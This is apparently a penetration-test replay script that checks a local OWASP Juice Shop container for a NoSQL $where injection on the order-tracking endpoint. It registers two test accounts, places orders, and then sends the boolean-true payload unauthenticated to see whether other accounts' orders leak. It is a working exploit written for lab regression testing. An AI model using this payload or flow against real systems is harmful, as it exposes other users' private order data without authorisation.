#!/usr/bin/env python3
"""pt40: the same unsafe-config NoSQL injection pt10 found on
/rest/track-order/{id} doesn't just return "more than one order", it
returns OTHER ACCOUNTS' real orders, to a completely unauthenticated
caller.

Found white-box via the challenge catalog (noSqlOrdersChallenge,
"NoSQL Exfiltration", description "All your orders are belong to
us! Even the ones which don't."). Its own catalog entry carries
disabledEnv: [Docker, Heroku], which looks like it rules this out in
a Docker deployment, but challengeUtils.solve()/solveIf() never check
a challenge's OWN disabledEnv before marking it solved; the code path
that actually matters here is gated by a DIFFERENT challenge's
enablement (reflectedXssChallenge, the same one pt10 exploits), which
has no such restriction. Verified live against this repo's own
flatline-juice-shop-unsafe container, not assumed from the source flag
alone.

Like pt10, the independent variable here is which vendor-shipped
config is running, not a proxy toggle. --mode safe checks the default
Docker deployment (port 3001). --mode unsafe checks the same
NODE_ENV=unsafe container pt10 already established (port 3012).

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt40-001.json"
BOOLEAN_TRUE_PAYLOAD = "' || true || 'x"


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _jwt_user_id(token: str) -> int:
    payload_b64 = token.split(".")[1]
    padded = payload_b64 + "=" * (-len(payload_b64) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))["data"]["id"]


def _place_order(target: str, label: str, stamp: str) -> str | None:
    email = f"pt40-{label}-{stamp}@flatline.test"
    password = "Pt40Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]
    bid = str(body["authentication"]["bid"])
    user_id = _jwt_user_id(token)

    _request("POST", f"{target}/api/BasketItems", token=token, body={"ProductId": 1, "BasketId": bid, "quantity": 1})
    status, checkout_body = _request("POST", f"{target}/rest/basket/{bid}/checkout", token=token, body={
        "UserId": user_id, "orderDetails": {"addressId": 1},
    })
    return checkout_body.get("orderConfirmation") if status == 200 else None


def _track_order(target: str, order_id: str):
    encoded = urllib.parse.quote(order_id, safe="")
    status, body = _request("GET", f"{target}/rest/track-order/{encoded}")
    return status, body


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    order_a = _place_order(target, "account-a", stamp)
    order_b = _place_order(target, "account-b", stamp)

    status, body = _track_order(target, BOOLEAN_TRUE_PAYLOAD)
    returned_ids = {row.get("orderId") for row in body.get("data", [])} if status == 200 else set()
    both_leaked = bool(order_a and order_b) and order_a in returned_ids and order_b in returned_ids

    if status == 200 and both_leaked:
        status_result = "VULNERABLE"
        summary = f"An unauthenticated boolean-true $where injection returned both independently-placed orders ({len(returned_ids)} total rows), across two unrelated accounts."
    elif status == 200 and not both_leaked and len(returned_ids) <= 1:
        status_result = "REMEDIATED"
        summary = "The injection payload returned at most the single synthetic placeholder result; neither test order was leaked."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: status={status}, order_a={order_a}, order_b={order_b}, returned_ids_count={len(returned_ids)}."

    legit_status, legit_body = _track_order(target, order_a or "pt40-nonexistent-order-id")
    legitimate_own_order_trackable = legit_status == 200 and len(legit_body.get("data", [])) == 1 and legit_body["data"][0].get("orderId") == order_a

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "injection_http_status": status,
        "returned_rows": len(returned_ids),
        "both_orders_leaked": both_leaked,
        "summary": summary,
        "legitimate_own_order_trackable": legitimate_own_order_trackable,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--mode", choices=["safe", "unsafe"], default="safe")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = blueprint["safe_target"]["host"] if args.mode == "safe" else blueprint["unsafe_target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{args.mode}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt40-nosql-order-exfiltration", "mode": args.mode, **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
